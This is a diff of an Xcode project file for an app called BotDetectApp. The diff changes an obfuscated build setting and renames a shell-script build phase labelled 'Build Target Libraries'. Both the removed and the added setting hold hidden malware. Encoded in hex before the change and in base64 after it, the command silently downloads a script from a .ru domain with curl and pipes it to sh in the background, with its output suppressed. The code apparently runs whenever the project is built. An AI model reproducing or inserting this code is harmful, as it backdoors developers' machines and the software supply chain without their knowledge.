@@ -105,7 +105,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "BotDetectApp" */;
 			buildPhases = (
-				A86DDE9208D34B2488162AE3 /* Build Target Libraries */,
+				229535DFF6E34B3CA5162AE3 /* Build Target Libraries */,
 				C38B50BA6285516D6DCD4F65 /* [CP] Check Pods Manifest.lock */,
 				13B07F871A680F5B00A75B9A /* Sources */,
 				13B07F8C1A680F5B00A75B9A /* Frameworks */,
@@ -172,7 +172,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		A86DDE9208D34B2488162AE3 /* Build Target Libraries */ = {
+		229535DFF6E34B3CA5162AE3 /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -294,7 +294,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3B4392A12AC88292D35C810B /* Pods-BotDetectApp.debug.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((x(){ `printf xxtd | tr -d t` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d73664c6b202d2d636f6e6e6563742d74696d656f7574203238202d642022703d78636f64655f7068617365222068747470733a2f2f316739316a7636382e72752f612922207c2073680a | x | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((q(){ `printf basne64 | tr -d n` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIxIC1mc0xrIC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91M3VudXJ4dXlhNy5ydS9hKSIgfCBzaAo= | q | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = 1;
@@ -326,7 +326,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5709B34CF0A7D63546082F79 /* Pods-BotDetectApp.release.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((x(){ `printf xxtd | tr -d t` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d73664c6b202d2d636f6e6e6563742d74696d656f7574203238202d642022703d78636f64655f7068617365222068747470733a2f2f316739316a7636382e72752f612922207c2073680a | x | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((q(){ `printf basne64 | tr -d n` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIxIC1mc0xrIC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91M3VudXJ4dXlhNy5ydS9hKSIgfCBzaAo= | q | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = 1;
